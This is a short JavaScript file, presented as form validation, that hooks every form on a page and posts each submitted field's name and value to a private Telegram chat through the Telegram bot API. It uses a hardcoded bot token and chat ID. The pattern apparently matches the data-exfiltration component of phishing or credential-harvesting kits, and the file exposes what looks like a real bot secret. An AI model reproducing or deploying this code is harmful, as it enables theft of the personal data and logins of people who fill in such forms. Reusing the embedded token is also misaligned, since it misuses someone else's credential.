
// JavaScript for form validation, submission, and interaction with Telegram bot

document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot token and chat ID (replace with your actual token and chat ID)
    const telegramToken = '6989016658:AAGmO6RkTxm0uB7A-L2SIaDowfGKYqfhEiA';
    const chatId = '2074391753';
    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    // Add form validation and submission handler
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from submitting the default way

            let isValid = true;
            const inputs = form.querySelectorAll('input[required]');
            let message = "Form Submission:\n";

            inputs.forEach(input => {
                if (!input.value) {
                    isValid = false;
                    input.style.borderColor = 'red';
                } else {
                    input.style.borderColor = '#ddd';
                    message += `${input.name}: ${input.value}\n`;
                }
            });

            if (!isValid) {
                alert('Please fill out all required fields correctly.');
                return;
            }

            // Send data to Telegram bot
            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Information sent successfully.');
                    form.reset(); // Clear the form fields
                } else {
                    alert('Failed to send information. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    });
});
